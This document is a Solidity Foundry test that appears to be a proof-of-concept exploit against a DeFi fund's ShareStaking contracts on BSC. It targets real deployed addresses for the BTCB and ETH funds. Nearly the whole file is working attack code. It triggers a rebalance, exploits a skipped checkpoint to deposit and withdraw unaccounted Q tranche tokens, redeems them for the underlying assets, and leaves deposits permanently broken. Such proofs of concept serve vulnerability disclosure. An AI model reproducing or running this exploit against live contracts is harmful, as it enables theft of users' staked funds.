// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity >=0.6.10 <0.8.0;
pragma experimental ABIEncoderV2;

import "contracts/fund/FundV3.sol";
import "contracts/fund/ShareStaking.sol";
import "contracts/fund/ShareV2.sol";
import "contracts/interfaces/IPrimaryMarketV3.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "forge-std/Test.sol";

contract TwapOracle {
    uint256 public twap;

    function setTwap(uint256 newTwap) external {
        twap = newTwap;
    }

    /// @notice Return TWAP with 18 decimal places in the epoch ending at the specified timestamp.
    /// @return TWAP (18 decimal places) in the epoch.
    function getTwap(uint256 timestamp) external view returns (uint256) {
        return twap;
    }
}

contract TrachessHack is Test {
    TwapOracle twapOracle;
    string BSC_RPC_URL = vm.envString("BSC_PUBLIC_RPC_URL");
    address attacker = address(this);
    // Alice account is controlled by the attacker
    address alice = makeAddr("alice");
    // All fundV3 contracts of all underlyings on BSC chain have the same owner
    address constant fundV3Owner = 0x4BB3AeB5Ba75bC6A44177907B54911b19d1cF8f7;
    uint256 internal constant TRANCHE_Q = 0;
    uint256 internal constant TRANCHE_B = 1;
    uint256 internal constant TRANCHE_R = 2;

    // Related addresses for BTCB fund on BSC chain
    ShareStaking constant shareStakingBtcb =
        ShareStaking(0x66f9D16dB828D340858b1fD4859c4030247d4b70);
    FundV3 constant fundV3Btcb = FundV3(0x2f40c245c66C5219e0615571a526C93883B456BB);
    IPrimaryMarketV3 constant primaryMarketV3Btcb =
        IPrimaryMarketV3(0x25c601a3fca896BE827ef47E52bfcAb18601Eb17);
    ShareV2 constant BTCB_BISHOP = ShareV2(0xF87E3D9c0fBD50eeB82cE55205Ad68D71177E77e);
    ShareV2 constant BTCB_ROOK = ShareV2(0x0e5304160fb7750E89F0A617F5E02bDcF15ac4a4);
    ShareV2 constant BTCB_QUEEN = ShareV2(0x81607ff6Fb66e089B573f2CDB428DE4C7fCDbDDE);
    IERC20 constant BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    uint256 constant rebalancePriceBtcb = 43300 * 10 ** 18;
    uint256 constant BTCB_FUND = 2_200 ether;

    // Related addresses for ETH fund on BSC chain
    ShareStaking constant shareStakingEth =
        ShareStaking(0xaF098f9AAdAd3bD8C9fc17CA16C7148f992Aa1b4);
    FundV3 constant fundV3Eth = FundV3(0x1F18cC2b50575A71dD2EbF58793d4e661a7Ba0e0);
    IPrimaryMarketV3 constant primaryMarketV3Eth =
        IPrimaryMarketV3(0xec887f1eD49Ff192A8Ac3Fcb82E120Bd6785F522);
    ShareV2 constant ETH_BISHOP = ShareV2(0x6369395Ab20386b3bf6FEfb30e6eb759012Fea89);
    ShareV2 constant ETH_ROOK = ShareV2(0xe94A3eaedCa412A92869345492cb95c1B80f4665);
    IERC20 constant ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    uint256 constant rebalancePriceEth = 2500 * 10 ** 18;
    uint256 constant ETH_FUND = 3_500 ether;

    function setUp() public {
        vm.createSelectFork(BSC_RPC_URL);

        // The ShareStaking contract can be exploited to drain its funds when the FundV3 contract performs a rebalance
        // To trigger a rebalance state in this fork mode, we need to manipulate the price of the underlying asset
        twapOracle = new TwapOracle();
    }

    /// @dev The attacker initiates the attack at 14:00 UTC, when the rebalance happens
    function testAttackVectorWhenNotHaveFund() public {
        uint256 currentDay = fundV3Btcb.currentDay();
        vm.warp(currentDay);

        // Attack on ShareStaking contract of BTCB underlying
        _setTwap(fundV3Btcb, rebalancePriceBtcb);
        uint256 drainedBtcbAmount = _initiateAttack(
            shareStakingBtcb,
            fundV3Btcb,
            primaryMarketV3Btcb,
            BTCB
        );

        // Attack on ShareStaking contract of ETH underlying
        _setTwap(fundV3Eth, rebalancePriceEth);
        uint256 drainedEthAmount = _initiateAttack(
            shareStakingEth,
            fundV3Eth,
            primaryMarketV3Eth,
            ETH
        );

        console.log(
            "BTCB amount drained when the attacker does not have fund: ",
            drainedBtcbAmount
        );
        console.log("ETH amount drained when the attacker does not have fund: ", drainedEthAmount);
    }

    /// @dev The attacker initiates the attack at 14 UTC, when the rebalance happens
    function testAttackVectorWhenHaveFund() public {
        // Attack on ShareStaking contract of BTCB underlying on BSC chain
        _setTwap(fundV3Btcb, rebalancePriceBtcb);
        _initiateAttackWhenHaveFund(
            shareStakingBtcb,
            fundV3Btcb,
            primaryMarketV3Btcb,
            BTCB_BISHOP,
            BTCB_ROOK,
            BTCB,
            BTCB_FUND
        );

        // Attack on ShareStaking contract of ETH underlying on BSC chain
        _setTwap(fundV3Eth, rebalancePriceEth);
        _initiateAttackWhenHaveFund(
            shareStakingEth,
            fundV3Eth,
            primaryMarketV3Eth,
            ETH_BISHOP,
            ETH_ROOK,
            ETH,
            ETH_FUND
        );

        console.log(
            "BTCB amount drained when the attacker has fund: ",
            IERC20(BTCB).balanceOf(attacker) + IERC20(BTCB).balanceOf(alice) - BTCB_FUND
        );
        console.log(
            "ETH amount drained when the attacker has fund: ",
            IERC20(ETH).balanceOf(attacker) + IERC20(ETH).balanceOf(alice) - ETH_FUND
        );
    }

    /// @dev After the attack, deposit() in the ShareStaking contract will always revert due to subtraction overflow
    ///      fund.trancheBalanceOf(tranche, address(shareStaking)).sub(oldTotalSupply) < 0
    function testDepositFailed() public {
        testAttackVectorWhenNotHaveFund();

        uint256 currentDay = fundV3Btcb.currentDay();
        vm.warp(currentDay + 1000);
        vm.roll(block.number + 1);
        uint256 drainedBtcbAmount = BTCB.balanceOf(attacker);
        uint256 rebalanceSize = fundV3Btcb.getRebalanceSize();

        BTCB.transfer(address(primaryMarketV3Btcb), drainedBtcbAmount);
        uint256 outQ = primaryMarketV3Btcb.getCreation(drainedBtcbAmount);
        primaryMarketV3Btcb.create(attacker, outQ, rebalanceSize);
        BTCB_QUEEN.approve(address(shareStakingBtcb), outQ);

        vm.expectRevert();
        shareStakingBtcb.deposit(TRANCHE_Q, outQ, alice, rebalanceSize);
    }

    function _setTwap(FundV3 fundV3, uint256 price) private {
        vm.prank(fundV3Owner);
        fundV3.updateTwapOracle(address(twapOracle));
        twapOracle.setTwap(price);
    }

    function _initiateAttackWhenHaveFund(
        ShareStaking shareStaking,
        FundV3 fundV3,
        IPrimaryMarketV3 primaryMarketV3,
        ShareV2 bishop,
        ShareV2 rook,
        IERC20 underlying,
        uint256 underlyingFund
    ) private {
        uint256 currentDay = fundV3.currentDay();
        vm.warp(currentDay);

        _depositFund(
            shareStaking,
            fundV3,
            primaryMarketV3,
            bishop,
            rook,
            underlying,
            underlyingFund
        );

        _initiateAttack(shareStaking, fundV3, primaryMarketV3, underlying);

        // The attacker withdraws the initial fund in the next block
        vm.warp(currentDay + 1000);
        vm.roll(block.number + 1);
        _withdrawFund(shareStaking, fundV3, primaryMarketV3, underlying);
    }

    function _depositFund(
        ShareStaking shareStaking,
        FundV3 fundV3,
        IPrimaryMarketV3 primaryMarketV3,
        ShareV2 bishop,
        ShareV2 rook,
        IERC20 underlying,
        uint256 underlyingFund
    ) private {
        // Buy Q with the fund
        deal(address(underlying), attacker, underlyingFund);
        underlying.transfer(address(primaryMarketV3), underlyingFund);
        uint256 outQ = primaryMarketV3.getCreation(underlyingFund);
        primaryMarketV3.create(attacker, outQ, fundV3.getRebalanceSize());

        // Split the bought Q to B and R, then deposit them into the ShareStaking contract
        uint256 outB = primaryMarketV3.split(attacker, outQ, fundV3.getRebalanceSize());
        bishop.approve(address(shareStaking), outB);
        rook.approve(address(shareStaking), outB);
        // Alice account is controlled by the attacker
        shareStaking.deposit(TRANCHE_B, outB, alice, fundV3.getRebalanceSize());
        shareStaking.deposit(TRANCHE_R, outB, alice, fundV3.getRebalanceSize());
    }

    function _initiateAttack(
        ShareStaking shareStaking,
        FundV3 fundV3,
        IPrimaryMarketV3 primaryMarketV3,
        IERC20 underlying
    ) private returns (uint256 drainedUnderlyingAmount) {
        uint256 stakingQBalanceBeforeRebalance = fundV3.trancheBalanceOf(
            TRANCHE_Q,
            address(shareStaking)
        );

        // Before initiating the rebalance, within the same transaction,
        // the attacker calls claimableRewards() in the ShareStaking contract in order to trigger the first _checkpoint() call
        shareStaking.claimableRewards(fundV3Owner);
        // Settle and trigger a rebalance
        fundV3.settle();

        uint256 rebalanceSize = fundV3Btcb.getRebalanceSize();
        // When the attacker make a deposit to the ShareStaking contract as shown below, _checkpoint() invoked within deposit() is skipped
        // because it's executed within the same block as the initial _checkpoint() (_checkpointTimestamp = block.timestamp).
        // As a result, the ShareStaking contract doesn't trigger a rebalance for the three tranches within that contract
        // Consequently, there's a mismatch between the expected _totalSupplies and the actual _totalSupplies,
        // this difference corresponds to the drainable Q amount.
        // spareAmount = fund.trancheBalanceOf(tranche, address(shareStaking)) - oldTotalSupply = drainable Q amount
        uint256 drainableQ = fundV3.trancheBalanceOf(TRANCHE_Q, address(shareStaking)) -
            stakingQBalanceBeforeRebalance;
        shareStaking.deposit(TRANCHE_Q, drainableQ, attacker, rebalanceSize);

        // The attacker withdraws the drainable Q amount to their address and redeems them
        // _checkpoint() called within withdraw() is also skipped
        shareStaking.withdraw(TRANCHE_Q, drainableQ, rebalanceSize);
        primaryMarketV3.redeem(attacker, drainableQ, 0, rebalanceSize);

        drainedUnderlyingAmount = underlying.balanceOf(attacker);
    }

    /// @dev The attacker withdraws the initial fund in the next block
    function _withdrawFund(
        ShareStaking shareStaking,
        FundV3 fundV3,
        IPrimaryMarketV3 primaryMarketV3,
        IERC20 underlying
    ) private {
        vm.startPrank(alice); // Alice account is controlled by the attacker

        uint256 rebalanceSize = fundV3.getRebalanceSize();
        uint256 aliceQBalance = shareStaking.trancheBalanceOf(TRANCHE_Q, alice);
        uint256 shareStakingQBalance = fundV3.trancheBalanceOf(TRANCHE_Q, address(shareStaking));
        // If alice's Q balance in the ShareStaking contract is greater than the ShareStaking contract's Q balance,
        // the attacker will withdraw all Q amount held by the ShareStaking contract
        if (aliceQBalance > shareStakingQBalance) {
            shareStaking.withdraw(TRANCHE_Q, shareStakingQBalance, rebalanceSize);
        } else {
            shareStaking.withdraw(TRANCHE_Q, aliceQBalance, rebalanceSize);
        }

        uint256 aliceBBalance = shareStaking.trancheBalanceOf(TRANCHE_B, alice);
        shareStaking.withdraw(TRANCHE_B, aliceBBalance, rebalanceSize);
        shareStaking.withdraw(TRANCHE_R, aliceBBalance, rebalanceSize);
        primaryMarketV3.merge(alice, aliceBBalance, rebalanceSize);

        uint256 aliceQBalanceAfterMerge = fundV3.trancheBalanceOf(TRANCHE_Q, alice);
        (uint256 drainableUnderlying, ) = primaryMarketV3.getRedemption(aliceQBalanceAfterMerge);
        uint256 fundV3Balance = IERC20(underlying).balanceOf(address(fundV3));

        // If the expected underlying amount received from the redemption is greater than the underlying balance of the FundV3 contract,
        // the attacker will redeem the entire Q supply
        if (drainableUnderlying > fundV3Balance) {
            primaryMarketV3.redeem(alice, fundV3.trancheTotalSupply(TRANCHE_Q), 0, rebalanceSize);
        } else {
            primaryMarketV3.redeem(alice, aliceQBalanceAfterMerge, 0, rebalanceSize);
        }

        vm.stopPrank();
    }
}
